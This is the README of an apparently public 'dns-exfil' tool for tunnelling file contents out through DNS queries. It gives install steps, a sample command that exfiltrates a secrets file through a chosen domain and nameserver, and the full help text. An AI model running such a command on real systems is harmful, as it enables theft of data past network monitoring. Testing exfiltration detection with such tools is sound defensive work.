# dns-exfil
A simple DNS exfiltration script.


## Installation
1. `git clone https://github.com/rybolov/dns-exfil.git`
2. `python3 -m venv ./venv`
3. `source ./venv/bin/activate`
4. `pip3 install -r requirements.txt`
4. `python3 ./main.py --file secrets.small.txt --type A --domain google.com --nameserver 9.9.9.9` 
5. Enjoy

```
$ python3 ./main.py --help

usage: main.py [-h] [--filename FILENAME] [--blocksize {4,5,6,7,8,9,10,11,12,13,14,15,16}] [--domain DOMAIN] [--data DATA] [--type {A,TXT}]
               [--nameserver NAMESERVER] [--verbose]

Exfiltrate data using DNS.
options:
  -h, --help            show this help message and exit
  --filename FILENAME, --file FILENAME, -f FILENAME, -i FILENAME, --input FILENAME
                        File to exfiltrate. (default: none)
  --blocksize {4,5,6,7,8,9,10,11,12,13,14,15,16}, -b {4,5,6,7,8,9,10,11,12,13,14,15,16}, -bs {4,5,6,7,8,9,10,11,12,13,14,15,16}
                        Size of blocks to encode. (default: 12)
  --domain DOMAIN, -d DOMAIN
                        Domain to use for tunneling. (default: google.com)
  --data DATA           Read data from the command line. (default: none)
  --type {A,TXT}, -t {A,TXT}
                        Read data from the command line. (default: TXT)
  --nameserver NAMESERVER, -n NAMESERVER, -ns NAMESERVER
                        Nameserver to query. (default: 8.8.8.8)
  --verbose, -v         Verbose output. (default: none)
```